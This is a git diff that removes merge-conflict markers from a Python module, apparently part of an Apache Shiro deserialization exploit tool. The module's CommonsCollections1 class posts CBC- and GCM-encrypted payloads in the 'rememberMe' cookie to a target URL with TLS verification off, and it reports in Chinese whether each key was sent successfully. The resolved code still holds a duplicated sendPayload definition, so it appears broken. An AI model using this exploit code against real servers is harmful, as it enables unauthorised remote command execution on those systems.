@@ -20,7 +20,6 @@ class CommonsCollections1(object):
     def process(self,url,command,resKey,func):
         self.sendPayload(url,command,resKey)
 
-<<<<<<< HEAD
 
     def gcm_encode(self,resKey,file_body):
 
@@ -45,8 +44,6 @@ class CommonsCollections1(object):
         return payload
 
     def sendPayload(self,url,command,resKey,fp=JAR_FILE):
-=======
->>>>>>> db206e0e1860fd7668d96871efc5c28349d93b1a
 
     def sendPayload(self,url,command,resKey,fp=JAR_FILE):
         key = resKey
@@ -67,7 +64,6 @@ class CommonsCollections1(object):
             }
             
         try:
-<<<<<<< HEAD
             x = requests.post(url,  headers=header, cookies={'rememberMe': payloadCBC.decode()+"="},verify=False, timeout=20)  # 发送验证请求1
             y = requests.post(url,  headers=header, cookies={'rememberMe': payloadGCM.decode()+"="},verify=False, timeout=20)  # 发送验证请求2
             #print("payload1已完成,字段rememberMe:看需要自己到源代码print "+payload.decode())
@@ -76,15 +72,6 @@ class CommonsCollections1(object):
                 print("[+]   ****CommonsCollections1模块   key: {} 已成功发送！  状态码:{}".format(str(resKey),str(x.status_code)))
             else:
                 print("[-]   ****CommonsCollections1模块   key: {} 发送异常！    状态码:{}".format(str(resKey),str(x.status_code)))
-=======
-            r = requests.get(target,  headers=header, cookies={'rememberMe': payload.decode()+"="},verify=False, timeout=20)  # 发送验证请求1
-            #print("payload1已完成,字段rememberMe:看需要自己到源代码print "+payload.decode())
-            if(r.status_code==200):
- 
-                print("[+]   ****CommonsCollections1模块   key: {} 已成功发送！  状态码:{}".format(str(key),str(r.status_code)))
-            else:
-                print("[-]   ****CommonsCollections1模块   key: {} 发送异常！    状态码:{}".format(str(key),str(r.status_code)))
->>>>>>> db206e0e1860fd7668d96871efc5c28349d93b1a
         except Exception as e:
             print(e)
             return False
